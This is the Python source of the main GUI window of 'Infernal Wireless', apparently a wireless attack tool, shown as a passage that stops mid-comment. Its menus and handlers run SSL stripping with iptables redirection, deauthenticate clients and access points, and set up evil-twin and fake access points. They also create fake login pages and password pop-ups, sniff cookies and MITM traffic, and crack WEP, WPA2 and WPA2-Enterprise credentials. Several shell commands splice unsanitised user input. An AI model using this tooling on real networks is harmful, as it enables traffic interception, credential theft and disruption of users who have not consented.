import httplib
import urllib2
import wx.html
import wx.lib.scrolledpanel
from bs4 import BeautifulSoup
from scapy.all import *
from subprocess import *

import access_to_db
import fakePagecreate
import notepad
import ntlm_hashes
import redirecthandle
import wless_commands
from project_form import *
from wp2_crack import *

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


class Example(wx.Frame):
    def __init__(self, *args, **kw):
        super(Example, self).__init__(*args, **kw)

        self.InitUI()

    def InitUI(self):

        #################### setting up the menu bar ###################
        menubar = wx.MenuBar()

        ######### file menu ######333
        fileMenu = wx.Menu()

        # fProject = fileMenu.Append(-1, "New Project", "Create a new project")
        configsrv = fileMenu.Append(-1, "Configure Software", "Configure the software")
        report_menu = fileMenu.Append(-1, "Add report to DB", "Add report to DB")
        pdf_report_menu = fileMenu.Append(-1, "Generate PDF Report", "Generate PDF Report")
        view_project_menu = fileMenu.Append(-1, "View Projects", "View Projects")
        notepad_menu = fileMenu.Append(-1, "Notepad", "Notepad")

        fitem = fileMenu.Append(wx.ID_EXIT, 'Quit', 'Quit application')
        menubar.Append(fileMenu, '&File')

        ############ tools menu
        toolbar1 = wx.Menu()
        tshark = toolbar1.Append(-1, "Tshark", 'Sniff the network')
        sslstrip2 = toolbar1.Append(-1, "SSL Strip", "SSL Strip")

        deauth_usermenu = toolbar1.Append(-1, "Deauth User", "Deauthenticate Users")
        deauth_all = toolbar1.Append(-1, "Deauthenticate Access Point", "Deauthenticate Access Point")
        kill_all = toolbar1.Append(-1, "Kill Srv", "Kill Infernal Wireless")
        radiusd_check = toolbar1.Append(-1, "Check freeradius", "Check if Freeradius installed")
        radiusd_install = toolbar1.Append(-1, "Install freeradius", "Install Freeradius")

        menubar.Append(toolbar1, "Tools")

        #################### Wireless Recon ###########
        reconmenu = wx.Menu()
        probrecon = reconmenu.Append(-1, "Probe Request Check", "Check Probe Request")
        wirelessScanner = reconmenu.Append(-1, "Scan Wireless", "Scan for Wireless Network")
        mapWireless = reconmenu.Append(-1, "Map Wireless Network", "Map Wireless Network")
        reconJava = reconmenu.Append(-1, "*Get Java Version", "Get the Java Version of target system")
        reconFlash = reconmenu.Append(-1, "*Get Flash Version", "Get Flash Version of target system")
        menubar.Append(reconmenu, 'Recon Wireless')

        ############## attack vector bar #######

        attackbar = wx.Menu()
        attackitem = attackbar.Append(-1, 'Pop up/ask password', 'pop up box password')
        fakelogin = attackbar.Append(-1, "Fake login page", "Create a fake login page")

        ##TO DO ####### I NEED TO CREATE A MODULE TO PERFORM METASPLOIT JAVA BASED ATTACK VIA URL
        mtsploit_java_attack = attackbar.Append(-1, "*Metasploit Java Attack", "Metasploit Java Attack")

        ##TO DO ####### I NEED TO CREATE A MODULE TO PERFORM METASPLOIT JAVA BASED ATTACK VIA URL
        mtsploit_flash_attack = attackbar.Append(-1, "*Metasploit Flash Attack", "Metasploit Flash Attack")
        #TODO
        #I need to implement beef xss
        beef_attack = attackbar.Append(-1, "Beef XSS Attack", "Metasploit Flash Attack")

        menubar.Append(attackbar, 'Attack Vectors')

        ############ wireless security ##########

        wirelessbar = wx.Menu()

        wpa2_submenu = wx.Menu()

        wpa2_hack = wpa2_submenu.Append(-1, "WPA2 Hacking", "WPA2 Hacking")
        stDump = wpa2_submenu.Append(-1, 'Kill airodump-ng', 'Kill airodump-ng')

        # ~ wpa2_hack = wirelessbar.Append(-1, 'Hack WPA2','Hacking WPA2')



        wpa2_hack_menu = wx.Menu()

        wpa2_hack_menu = wirelessbar.AppendMenu(-1, "WPA2 Hacking", wpa2_submenu)
        # ~ wpa2_hack = wirelessbar.Append(-1, 'Hack WPA2','Hacking WPA2')

        wpe2entr = wirelessbar.Append(-1, "WPA2 Enterprise Hacking", "Hacking WPA2 Enterprise")

        os.system('echo "" > ./Modules/Logs/assessment_logs.txt')

        imp = wx.Menu()
        cmpIVs = imp.Append(-1, 'Caputre IVs', 'Caputre IVs')
        fakeAuthenticate = imp.Append(-1, "Perform Fake Authentication", "Perform Fake Authentication")
        replaymode = imp.Append(-1, "ARP Requeste Replay Mode", "ARP Requeste Replay Mode")
        crackwep = imp.Append(-1, 'Crack WEP Hashes', 'Crack WEP Hashes')

        wirelessbar.AppendMenu(-1, 'WEP Hacking', imp)
        evltwin = wirelessbar.Append(-1, 'Evil Twin Attack', 'Perform Evil Twin attack')
        infernalwireless = wirelessbar.Append(-1, "Perform Infernal Wireless Attack")
        freeInternet = wirelessbar.Append(-1, "Create Fake AP", "Create Fake AP")
        freeInternetwpa2 = wirelessbar.Append(-1, "Create Fake WPA2 AP", "Create Fake WPA2 AP")

        menubar.Append(wirelessbar, "Wireless Hacking")

        ############## WEP SUBMENU###############





        ############### Cracking Hashes #########
        crackbar = wx.Menu()
        WPA2crack = crackbar.Append(-1, 'Crack WPA2 Handshake', 'Crack WPA2 Handshake')
        WPA2ENTcrack = crackbar.Append(-1, 'Crack WPA2ENT Challenge/Response', 'Crack Challenge/Response')
        menubar.Append(crackbar, 'Cracking')

        ################## LOG FILES ###########
        logmenu = wx.Menu()
        # loginlog = logmenu.Append(-1, "*Login Creds", "Check for login credentials")
        # WPA2_log = logmenu.Append(-1, "*WPA2", "WPA2 Cracks")
        WPA2ENT_log = logmenu.Append(-1, "WPA2ENT", "WPA2Ent Logs")
        victim_IP_list = logmenu.Append(-1, "Victims IP", "Victim IP and Browser Info")
        MiTM_data = logmenu.Append(1, "MiTM Sniff Data", "MiTM Sniff Data")
        # CC_log = logmenu.Append(-1, "*Credit Card", "CC Logs")
        session_log = logmenu.Append(-1, "HTTP Session Log", "HTTP Session Log")
        db_log = logmenu.Append(-1, "Infenral Wireless Log", "Infenral Wireless Log")
        popup_log = logmenu.Append(-1, "Pop Up password Log", "Pop Up password Log")
        menubar.Append(logmenu, "Logs")

        ################### About ###########

        aboutmenu = wx.Menu()
        tutorials_help = aboutmenu.Append(-1, "Help/Tutorials")
        abouttool = aboutmenu.Append(-1, "About Tool", "About Tool")
        wifi_card_info = aboutmenu.Append(-1, "About your wifi card", "About your wifi card")
        aboutme = aboutmenu.Append(-1, "About Author", "About me")
        suggestions = aboutmenu.Append(-1, "Suggestions/feedback", "Suggestions/feedback")
        updateCheck = aboutmenu.Append(-1, "Check Update", "Check Update")
        menubar.Append(aboutmenu, "About")

        ############# Scan Wizard ###########

        wizardMenu = wx.Menu()
        wizardSelect = wizardMenu.Append(-1, 'Wireless Attack Wizard', 'Wireless Attack Wizard')
        menubar.Append(wizardMenu, 'Wireless Wizard')

        self.SetMenuBar(menubar)
        # ~
        ############ assigning functions to the menu items
        self.Bind(wx.EVT_MENU, self.OnQuit, fitem)

        self.Bind(wx.EVT_MENU, self.popgetlog, popup_log)

        self.Bind(wx.EVT_MENU, self.checkUpdate, updateCheck)

        self.Bind(wx.EVT_MENU, self.configure, configsrv)

        self.Bind(wx.EVT_MENU, self.saveNotes, notepad_menu)

        self.Bind(wx.EVT_MENU, self.generate_pdf, pdf_report_menu)

        self.Bind(wx.EVT_MENU, self.view_reports, view_project_menu)
        self.Bind(wx.EVT_MENU, self.tshark_capture, tshark)

        self.Bind(wx.EVT_MENU, self.sslStrip, sslstrip2)

        ## todo : I need to create a function to deauth specific user ##

        self.Bind(wx.EVT_MENU, self.http_session_sniffer, session_log)

        self.Bind(wx.EVT_MENU, self.deauth_ssid, deauth_all)

        self.Bind(wx.EVT_MENU, self.killall, kill_all)

        self.Bind(wx.EVT_MENU, self.radiusd_check, radiusd_check)

        self.Bind(wx.EVT_MENU, self.install_radiusd, radiusd_install)

        self.Bind(wx.EVT_MENU, self.probRequest, probrecon)

        self.Bind(wx.EVT_MENU, self.wireless_scan, wirelessScanner)

        self.Bind(wx.EVT_MENU, self.stDump_kill, stDump)

        self.Bind(wx.EVT_MENU, self.fake_page_create, fakelogin)

        self.Bind(wx.EVT_MENU, self.wpa_crack, wpa2_hack)

        self.Bind(wx.EVT_MENU, self.wpe_ssid_get, wpe2entr)

        self.Bind(wx.EVT_MENU, self.Evil_Twin_Attack, evltwin)

        self.Bind(wx.EVT_MENU, self.infernalWireless, infernalwireless)

        self.Bind(wx.EVT_MENU, self.free_evil, freeInternet)

        self.Bind(wx.EVT_MENU, self.free_evil_wpa2, freeInternetwpa2)

        self.Bind(wx.EVT_MENU, self.deauth_user, deauth_usermenu)

        self.Bind(wx.EVT_MENU, self.fakepopup, attackitem)

        self.Bind(wx.EVT_MENU, self.beef_attack, beef_attack)

        self.Bind(wx.EVT_MENU, self.captureIV, cmpIVs)

        self.Bind(wx.EVT_MENU, self.fakeAPauth, fakeAuthenticate)

        self.Bind(wx.EVT_MENU, self.wep_replay, replaymode)

        self.Bind(wx.EVT_MENU, self.wep_crack, crackwep)

        self.Bind(wx.EVT_MENU, self.wp2_cracker, WPA2crack)

        self.Bind(wx.EVT_MENU, self.wpa2ent_cracker, WPA2ENTcrack)

        self.Bind(wx.EVT_MENU, self.wpa2ent_log, WPA2ENT_log)
        # generate_report
        self.Bind(wx.EVT_MENU, self.wpa2ent_log, WPA2ENT_log)

        self.Bind(wx.EVT_MENU, self.generate_report, report_menu)

        self.Bind(wx.EVT_MENU, self.about_tool, abouttool)

        self.Bind(wx.EVT_MENU, self.mapWireless, mapWireless)

        self.Bind(wx.EVT_MENU, self.about_author, aboutme)

        self.Bind(wx.EVT_MENU, self.wizrd_launch, wizardSelect)

        self.Bind(wx.EVT_MENU, self.getVictimInfo, victim_IP_list)

        self.Bind(wx.EVT_MENU, self.getInfernalLog, db_log)

        self.Bind(wx.EVT_MENU, self.MiTM_sniffing, MiTM_data)

        self.Bind(wx.EVT_MENU, self.suggestions, suggestions)

        self.Bind(wx.EVT_MENU, self.wifi_card_info, wifi_card_info)

        self.Bind(wx.EVT_MENU, self.helpMenu, tutorials_help)

        # self.Bind(wx.EVT_MENU, self.printme, attackitem)





        #################### setting up the menu bar ###################

        # ~ pnl = wx.Panel(self)

        pnl = wx.lib.scrolledpanel.ScrolledPanel(self, -1)  # wx.Panel(self)
        pnl.SetBackgroundColour('#98a3b2')
        pnl.SetupScrolling()

        ######### spider
        try:

            start_image = wx.Image("./Modules/img/spider.png")
            start_image.Rescale(180, 140)
            image = wx.BitmapFromImage(start_image)
            pic = wx.StaticBitmap(pnl, -1, image, pos=(200, 50), style=wx.BITMAP_TYPE_PNG)
        except:
            wx.MessageBox('ICON Missing', 'Warning', wx.ICON_ERROR | wx.ICON_INFORMATION)

        ######## logo
        try:

            start_image2 = wx.Image("./Modules/img/scorpion.png")
            start_image2.Rescale(450, 150)
            image2 = wx.BitmapFromImage(start_image2)
            pic2 = wx.StaticBitmap(pnl, -1, image2, pos=(680, 70), style=wx.BITMAP_TYPE_PNG)
        except:
            wx.MessageBox('ICON Missing', 'Warning', wx.ICON_ERROR | wx.ICON_INFORMATION)

        # ~ def check_project():
        # ~
        # ~ print project_form.Example.returnproject(self)
        # ~
        # ~ check_project()

        # ~ if not os.path.exists(isItProject):
        # ~ os.makedirs(isItProject)

        # ~
        #		pic.SetBitmap(wx.Bitmap("img/spider.png"))
        # ~
        ###################################################################################################
        ################### THIS SECTION IS WORKING BUT COMMENTED OUT FOR DEBUGGING PURPOSE################
        ###################################################################################################
        # ~ attackbtn = wx.Button(pnl, label='Attack Methods', pos=(20,30))
        # ~ attackbtn.Bind(wx.EVT_BUTTON, self.OnClose)
        # ~ attackbtn.SetToolTip(wx.ToolTip("Accompanying attacks for MiTM over wireles"))
        # ~
        # ~ toolbtn = wx.Button(pnl, label='TShark', pos=(150,30))
        # ~ toolbtn.Bind(wx.EVT_BUTTON, self.tshark_capture)
        # ~ toolbtn.SetToolTip(wx.ToolTip("Start capturing data via TShark"))
        # ~
        # ~ confbtn = wx.Button(pnl, label='Configure', pos=(250,30))
        # ~ confbtn.Bind(wx.EVT_BUTTON, self.configure)
        # ~ confbtn.SetToolTip(wx.ToolTip("Configure the database and install pre-req."))
        # ~
        # ~ Logsbtn = wx.Button(pnl, label='Logs', pos=(350,30))
        # ~ Logsbtn.Bind(wx.EVT_BUTTON, self.printme)
        # ~ Logsbtn.SetToolTip(wx.ToolTip("Log files of the tool"))
        # ~
        # ~ aboutbtn = wx.Button(pnl, label='About', pos=(450,30))
        # ~ aboutbtn.Bind(wx.EVT_BUTTON, self.printme)
        # ~ aboutbtn.SetToolTip(wx.ToolTip("About the author, tool and bug report"))
        # ~
        # ~ fakepagebtn = wx.Button(pnl, label='View Faked Page', pos=(450,30))
        # ~ fakepagebtn.Bind(wx.EVT_BUTTON, self.viewFakedPage)
        # ~ fakepagebtn.SetToolTip(wx.ToolTip("View Faked page"))
        # ~
        # ~ killbtn = wx.Button(pnl, label='Kill Srv', pos=(590,30))
        # ~ killbtn.Bind(wx.EVT_BUTTON, self.killall)
        # ~ killbtn.SetToolTip(wx.ToolTip("Kill background services"))
        # ~
        # ~ freebtn = wx.Button(pnl, label='Free Internet', pos=(700,30))
        # ~ freebtn.Bind(wx.EVT_BUTTON, self.free_evil)
        # ~ freebtn.SetToolTip(wx.ToolTip("Create free fake Internet"))
        # ~ #aboutbtn.SetBackgroundColour('BLUE')
        # ~
        # ~
        # ~ ############### CONFIGURE BELOW BUTTONS
        # ~
        # ~ ifcbtn = wx.Button(pnl, label='Notepad', pos=(20,90))
        # ~ ifcbtn.Bind(wx.EVT_BUTTON, self.saveNotes)
        # ~ ifcbtn.SetToolTip(wx.ToolTip("Opens a notepad for notes, tasks and more"))
        # ~
        # ~ dbbtn = wx.Button(pnl, label='Sniff Probs', pos=(150,90))
        # ~ dbbtn.Bind(wx.EVT_BUTTON, self.probRequest)
        # ~ dbbtn.SetToolTip(wx.ToolTip("Sniff Probe requests"))
        # ~
        # ~ evtwbtn = wx.Button(pnl, label='Evil Twin', pos=(450,90))
        # ~ evtwbtn.Bind(wx.EVT_BUTTON, self.test)
        # ~ evtwbtn.SetToolTip(wx.ToolTip("Create an Evil Twin attack"))
        # ~
        # ~ inwlbtn = wx.Button(pnl, label='Infernal Wireless', pos=(550,90))
        # ~ inwlbtn.Bind(wx.EVT_BUTTON, self.infernalWireless)
        # ~ inwlbtn.SetToolTip(wx.ToolTip("Create Infernal Wireless Attack"))
        # ~
        # ~ snprobbtn = wx.Button(pnl, label='Deauth SSID', pos=(700,90))
        # ~ snprobbtn.Bind(wx.EVT_BUTTON, self.deauth_ssid)
        # ~ snprobbtn.SetToolTip(wx.ToolTip("Send Deauthentication request to SSID"))
        # ~
        # ~
        # ~
        # ~ ############## configure second below buttons
        # ~
        # ~ ifcbtn2 = wx.Button(pnl, label='Scan Range  ', pos=(20,150))
        # ~ ifcbtn2.Bind(wx.EVT_BUTTON, self.wireless_scan)
        # ~ ifcbtn2.SetToolTip(wx.ToolTip("Scan wireless range"))
        # ~
        # ~ dbbtn = wx.Button(pnl, label='Fake Login', pos=(150,150))
        # ~ dbbtn.Bind(wx.EVT_BUTTON, self.fake_page_create)
        # ~ dbbtn.SetToolTip(wx.ToolTip("Create a fake login page for Social Engineering attack"))
        # ~
        # ~ evtwbtn = wx.Button(pnl, label='Enable SSL', pos=(450,150))
        # ~ evtwbtn.Bind(wx.EVT_BUTTON, self.sslStrip)
        # ~ evtwbtn.SetToolTip(wx.ToolTip("Enable SSL Strip to sniff SSL enabled pages"))
        # ~
        # ~ inwlbtn = wx.Button(pnl, label='WPA2 Ent. Hack ', pos=(550,150))
        # ~ inwlbtn.Bind(wx.EVT_BUTTON, self.wpe_ssid_get)
        # ~ inwlbtn.SetToolTip(wx.ToolTip("WPA2 Enterprise Hacking via hostapd and radius server"))
        # ~
        # ~ snprobbtn2 = wx.Button(pnl, label='WPA/2 Attack', pos=(700,150))
        # ~ snprobbtn2.Bind(wx.EVT_BUTTON, self.wpa_crack)
        # ~ snprobbtn2.SetToolTip(wx.ToolTip("WPA/2 attack"))

        ###################################################################################################
        ################### THIS SECTION IS WORKING BUT COMMENTED OUT FOR DEBUGGING PURPOSE################
        ###################################################################################################

        read_only_txt = wx.TextCtrl(pnl, -1, 'Wireless Reconnaissance Result', style=wx.TE_MULTILINE | wx.TE_READONLY,
                                    pos=(20, 200), size=(500, 600))

        # wireless_scan = wx.TextCtrl(pnl, -1, "wireless can results will be displayed here", style=wx.TE_MULTILINE,pos=(450, 200),size=(400,300))


        ##~ snotebtn = wx.Button(pnl, label='Save Note ', pos=(450,515))
        ##~ snotebtn.Bind(wx.EVT_BUTTON, self.saveNotes)


        # Notes = wx.TextCtrl(pnl, -1, "Attacker can take notes here", style=wx.TE_MULTILINE,pos=(450, 550),size=(400,250)).GetValue()
        # Notes_gui = wx.TextCtrl(pnl, -1, "Attacker can take notes here", style=wx.TE_MULTILINE,pos=(450, 550),size=(400,250)).GetValue()

        self.timer = wx.Timer(self)

        mylogs = ''

        # def infernal_log_writer(log_array):





        def read_logs(self):

            log_file = open('./Modules/Logs/assessment_logs.txt', 'r').read()
            global mylogs

            mylogs = str(log_file)

            if len(mylogs) > 5:
                view_logs = wx.TextCtrl(pnl, -1, mylogs, style=wx.TE_MULTILINE | wx.TE_READONLY, pos=(680, 200),
                                    size=(500, 600))

        # ~ wx.CallLater(2000, read_logs)
        # ~ log_file.close()

        # ~ self.timer = wx.Timer(self)
        view_logs = wx.TextCtrl(pnl, -1, '', style=wx.TE_MULTILINE | wx.TE_READONLY, pos=(680, 200), size=(500, 600))
        self.Bind(wx.EVT_TIMER, read_logs, self.timer)
        self.timer.Start(5000)

        # ~ wx.CallLater(2000,read_logs)
        # ~ read_logs(self.timer)
        # ~ self.timer.Start(1000)

        # ~
        # ~ myList = ['ssl strip', 'DB logs', 'Credentials','CC Info','session cookies', 'Media', 'NTLM Hashes']
        # ~ combo_box = wx.ComboBox(pnl, id=-1, value="View Logs", pos=(880, 150), size=(160, 30), choices=myList, style=0, name='logs')


        # test = WPA2_crack.crack_wpa2_handshake()

        ########### I need to work on it tomorrow
        # ~ wpa2Crackbtn = wx.Button(pnl, label='Crack WPA2 HSK ', pos=(880, 100))
        # ~
        # ~ wpa2Crackbtn.Bind(wx.EVT_BUTTON, self.wp2_cracker)
        # ~ wpa2Crackbtn.SetToolTip(wx.ToolTip("Crack WPA2 handshakes"))

        ########### I need to work on it tomorrow

        self.SetSize((1200, 900))
        self.SetTitle('Infernal Wireless - Wireless Security Assessment Tool')
        self.SetMaxSize((1200,900))
        self.SetMinSize((1200,900))
        self.Centre()

        self.Show(True)

    ########### text aread ######
    def OnQuit(self, e):
        self.Close()

    def wizrd_launch(self, e):
        import wizard_scanner

    def checkUpdate(self, e):
        request = urllib2.urlopen("https://github.com/entropy1337/infernal-twin/README.md")
        check = request.readline().strip('\n')
        if check != 'Infernal-Wireless v2':
            wx.MessageBox('New Version Available', 'Information', wx.ICON_INFORMATION)
        else:
            wx.MessageBox('No Updates Available', 'Information', wx.ICON_INFORMATION)

    def stDump_kill(self, e):
        os.system("kill  `ps aux | grep airodump-ng | head -1 | awk '{print $2}'`")
        os.system("kill  `ps aux | grep airodump-ng | head -1 | awk '{print $2}'`")
        monitoring_interface = wless_commands.get_monitoring_interfaces()[0]
        os.system("airmon-ng stop " + monitoring_interface)
        os.system("airmon-ng check kill &")

    def killall(self, e):
        monitoring_interface = wless_commands.get_monitoring_interfaces()[0]
        os.system("airmon-ng check kill &")
        os.system("kill  `ps aux | grep hostapd | head -1 | awk '{print $2}'`")
        os.system("kill  `ps aux | grep dnsmasq | head -1 | awk '{print $2}'`")

        os.system("airmon-ng stop " + monitoring_interface)

        os.system("kill  `ps aux | grep aircrack-ng | head -1 | awk '{print $2}'`")
        os.system("kill  `ps aux | grep radiusd | head -1 | awk '{print $2}'`")
        os.system("airodump-ng check kill 2>&1")
        # ~ wx.MessageBox('Wait for 3 seconds', 'Info', wx.OK | wx.ICON_INFORMATION)
        time.sleep(1)

        wx.MessageBox('Killed Conflict Processes', 'Info', wx.OK | wx.ICON_INFORMATION)

    def install_radiusd(self, e):
        try:
            os.system('sh Modules/install_freeradius.sh')
            wx.MessageBox('Freeradius/radiusd is installed', 'Information', wx.ICON_INFORMATION)

        except:
            wx.MessageBox('Please check your internet connectivity or run as root', 'Information', wx.ICON_INFORMATION)

    def radiusd_check(self, e):
        check_rd = subprocess.Popen(["which", "radiusd"], stdout=subprocess.PIPE)
        (out, err) = check_rd.communicate()
        if "radiusd" in out:
            wx.MessageBox('Freeradius/radiusd is installed', 'Information', wx.ICON_INFORMATION)
        else:
            fRadius_install = '''wget ftp://ftp.freeradius.org/pub/radius/old/freeradius-server-2.1.11.tar.bz2
wget http://www.opensecurityresearch.com/files/freeradius-wpe-2.1.11.patch

tar -jxvf freeradius-server-2.1.11.tar.bz2

cd freeradius-server-2.1.11

patch -p1 < ../freeradius-wpe-2.1.11.patch

./configure

make

sudo make install

sh /usr/local/etc/raddb/certs/bootstrap


or click on tool menu and click on Install Freeradius
'''
            wx.MessageBox('Please Intall Free Radius Server', 'Warning/Error', wx.ICON_ERROR)
            wx.MessageBox(fRadius_install, 'Information', wx.ICON_INFORMATION)

    def OnClose(self, e):
        self.Close(True)

    def mapWireless(self, e):
        import map_wireless
        map_wireless.main()

    # ~ iface = wless_commands.get_monitoring_interfaces()[0]
    # ~ wless_commands.bring_wlan_devs_up([iface])
    # ~ #os.system("airmon-ng stop mon0")
    # ~ wless_commands.start_airmon([iface])
    # ~ def ask(parent=None, message='', default_value=''):
    # ~
    # ~ dlg = wx.TextEntryDialog(parent, message, defaultValue=default_value)
    # ~ dlg.ShowModal()
    # ~ result = dlg.GetValue()
    # ~ dlg.Destroy()
    # ~ return result
    # ~
    # ~ user = str(ask(message = 'Enter the name for the dump file\nHit Ctrl+C on Dump Window to Stop Scanning')).strip()
    # ~
    # ~ try:
    # ~ os.system('mkdir ./Modules/Logs/' + user)
    # ~ except:
    # ~ wx.MessageBox('Choose Different name', 'Information', wx.ICON_INFORMATION)
    # ~ monitoring_interface = wless_commands.get_monitoring_interfaces()[0]
    # ~ try:
    # ~
    # ~ os.system("airodump-ng -w "+user+"/"+user+" "+monitoring_interface)
    # ~
    # ~ os.system("airgraph-ng -i "+user+"/"+user+"*.csv -o "+user+"/"+user+".png -g CAPR")
    # ~ except:
    # ~ wx.MessageBox('Please configure software here:\nFile -> Configure Software', 'Information', wx.ICON_INFORMATION)




    def sslStrip(self, e):
        try:

            def ask(parent=None, message='', default_value=''):
                dlg = wx.TextEntryDialog(parent, message, defaultValue=default_value)
                dlg.ShowModal()
                result = dlg.GetValue()
                dlg.Destroy()
                return result

            internet_iface = str(self.ask(message='Enter Internet Facing Interface/Outbound Interface')).strip()
            hack_wireless_interface = str(
                self.ask(message='Enter the Wireless Interface name which are you testing from')).strip()

            os.system("""iptables --flush
			iptables --table nat --flush
			iptables --delete-chain
			iptables --table nat --delete-chain
			iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
			iptables -t nat -A POSTROUTING -o %s -j MASQUERADE
			iptables -A FORWARD -i %s -o %s -j ACCEPT""" % (internet_iface, hack_wireless_interface, internet_iface))

            if not os.path.exists('./Modules/Logs/sslstrip.log'):
                os.system('touch ./Modules/Logs/sslstrip.log')
            os.system("gnome-terminal -x sslstrip -akf --write=./Modules/Logs/sslstrip.log")
        except:
            wx.MessageBox('There seem to be error with an interface\nMake sure you eth0 have Internet Access',
                          'Warning/Error', wx.ICON_ERROR | wx.ICON_INFORMATION)

    def printme(self, e):
        print 'Hello World'

    def about_tool(self, e):

        frm = MyHtmlFrame2(None, 'About the tool')
        frm.Show()

    def about_author(self, e):

        frm = authorwindows(None, 'About Author')
        frm.Show()

    def popgetlog(self,e):
        import popproxylog
        popproxylog.popLog()

    def getVictimInfo(self, e):
        # ~ print 'It should be printed'
        import getVictimIP

        getVictimIP.startSniff()

    def MiTM_sniffing(self, e):
        # ~ print 'importing MiTM sniffing'
        import MiTM_sniffer
        MiTM_sniffer.startSniff()

    def Evil_Twin_Attack(self, e):
        frm = EvilWindow(None, id=-1)
        frm.Show()

    def http_session_sniffer(self,e):
        import cookie_sniffer
        cookie_sniffer.startSniff()

    def wpa2ent_log(self, e):

        ntlm_hashes.launch_ntlm_cracker()



    def db_log_access(self, e):
        access_to_db.access_to_database()

    def getInfernalLog(self,e):

        import infernal_logs
        infernal_logs.checkLog()



    def suggestions(self, e):
        frm = suggestions(None, 'Suggestions')
        frm.Show()

    def wifi_card_info(self, e):
        frm = wifi_card_info(None, 'About Your Wireless Card')
        frm.Show()

    def tshark_capture(self, e):
        os.system("gnome-terminal -x tshark -i any tcp port 80 or tcp port 443 -V -w network_capture.cap &")

    def saveNotes(self, data):

        notepad.openit()

    def generate_pdf(self, e):
        import fetch_db
        fetch_db.main()

    def view_reports(self, e):
        import view_projects
        view_projects.main()

    def fake_page_create(self, e):
        fakePagecreate.openit()

    def generate_report(self, e):
        import report_generator
        report_generator.create_new_project()

    def ask(parent=None, message='', default_value=''):
        dlg = wx.TextEntryDialog(parent, message, defaultValue=default_value)
        dlg.ShowModal()
        result = dlg.GetValue()
        dlg.Destroy()
        return result

    def ask2(parent=None, message='', numbers=1, default_value=''):

        dlg = wx.TextEntryDialog(parent, message, defaultValue=default_value)

        dlg.ShowModal()
        result = dlg.GetValue()
        dlg.Destroy()
        return result

    def configure(self, e):
        try:

            os.system("apt-get install -y --force-yes hostapd dnsmasq &")
            os.system("apt-get install bridge-utils &")
            os.system("pip install reportlab &")
            os.system("pip apt-get install bridge-utils &")
            os.system("python ./Modules/airgraph-ng/setup.py build &")
            os.system("python ./Modules/airgraph-ng/setup.py install &")

        except:
            wx.MessageBox('Could not dowload the packages.\nPlease Connect to Internet', 'Warning/Error',
                          wx.ICON_ERROR | wx.ICON_INFORMATION)

    def deauth_user(self, e):
        import deauth_user
        deauth_user.main()

    # ~ wlan_ifaces = wless_commands.get_monitoring_interfaces()
    # ~ if not wlan_ifaces:
    # ~ wx.MessageBox('make sure you have mon0 interface',
    # ~ 'Warning/Error', wx.ICON_ERROR | wx.ICON_INFORMATION)
    # ~ return
    # ~
    # ~ mon_iface = wlan_ifaces[0]
    # ~ #os.system("airmon-ng start wlan0")
    # ~
    # ~ ssid = str(self.ask(message = 'Enter the SSID')).strip()
    # ~ MAC = str(self.ask(message = 'Enter the MAC')).strip()
    # ~
    # ~ packet_count = str(self.ask2(message = 'Enter the number of packets to send')).strip()
    # ~
    # ~ os.system("aireplay-ng -0 "+packet_count+" -e "+ssid+" -c "+MAC+" "+mon_iface+" --ignore-negative-one &")
    # ~ print 'Aireplay against client is started'

    def deauth_ssid(self, e):
        import deauth_ssid
        deauth_ssid.main()

    # ~ wlan_ifaces = wless_commands.get_monitoring_interfaces()
    # ~ if not wlan_ifaces:
    # ~ wx.MessageBox('make sure you have monitoring interface up',
    # ~ 'Warning/Error', wx.ICON_ERROR | wx.ICON_INFORMATION)
    # ~ return
    # ~
    # ~ mon_iface = wlan_ifaces[0]
    # os.system("airmon-ng start wlan0")

    # ~ ssid = str(self.ask2(message = 'Enter the SSID')).strip()
    # ~ packet_count = str(self.ask2(message = 'Enter the number of packets to send')).strip()
    # ~ print "aireplay-ng -0 10 -e "+ssid+" "+mon_iface+" --ignore-negative-one &"
    # ~ print "gnome-terminal -x aireplay-ng -0 10 -e "+ssid+" "+mon_iface+" --ignore-negative-one &"

    # ~ os.system("gnome-terminal -x aireplay-ng -0 "+packet_count+" -e "+ssid+" "+mon_iface+" --ignore-negative-one")
    # ~
    # ~ print 'Aireplay against whole network started'
    # ~ os.system("airmon-ng stop mon0")


    ################  FREE WPA2 INTERNET ######

    def free_evil_wpa2(self,e):
        import createFakewpa2
        createFakewpa2.main()


    ################  FREE INTERNET ###############
    def free_evil(self, e):

        import createFakeAp
        createFakeAp.main()

    # ~ net_ifaces = wless_commands.get_net_devices()
    # ~ wlan_ifaces = wless_commands.get_monitoring_interfaces()
    # ~
    # ~ def ask(parent=None, message='', default_value=''):
    # ~ dlg = wx.TextEntryDialog(parent, message, defaultValue=default_value)
    # ~ dlg.ShowModal()
    # ~ result = dlg.GetValue()
    # ~ dlg.Destroy()
    # ~ return result
    # ~
    # ~
    # ~
    # ~ internet_iface = str(ask(message = 'Enter Outbound Internet Interface.\ni.e. eth0, eth1, eth2')).strip()
    # ~ if internet_iface not in net_ifaces:
    # ~ wx.MessageBox('make sure you have network interface',
    # ~ 'Warning/Error', wx.ICON_ERROR | wx.ICON_INFORMATION)
    # ~ return
    # ~ elif not wlan_ifaces:
    # ~ wx.MessageBox('make sure you have wlan interface',
    # ~ 'Warning/Error', wx.ICON_ERROR | wx.ICON_INFORMATION)
    # ~ return
    # ~
    # ~ wlan_iface = wlan_ifaces[0]
    # ~ wless_commands.bring_wlan_devs_up([wlan_iface])
    # ~
    # ~ os.system("ifconfig "+internet_iface+" up")
    # ~
    # ~ hostapd = open('./Modules/hostapd-freenet.conf', 'wb')
    # ~ config_file = "interface="+wlan_iface+"\ndriver=nl80211\nssid=Free Internet\nchannel=1\n#enable_karma=1\n"
    # ~ hostapd.write(config_file)
    # ~ hostapd.close()
    # ~ os.system("gnome-terminal -x hostapd ./Modules/hostapd-freenet.conf &")
    # ~ os.system("""sed -i 's#^DAEMON_CONF=.*#DAEMON_CONF=/etc/hostapd/hostapd.conf#' /etc/init.d/hostapd
    # ~ cat <<EOF > /etc/dnsmasq.conf
    # ~ log-facility=/var/log/dnsmasq.log
    # ~ #address=/#/10.0.0.1
    # ~ #address=/google.com/10.0.0.1
    # ~ interface=%s
    # ~ dhcp-range=10.0.0.10,10.0.0.250,12h
    # ~ dhcp-option=3,10.0.0.1
    # ~ dhcp-option=6,10.0.0.1
    # ~ #no-resolv
    # ~ log-queries
    # ~ EOF"""%wlan_iface)
    # ~
    # ~ os.system("service dnsmasq start")
    # ~
    # ~ os.system("""ifconfig """+wlan_iface+""" up
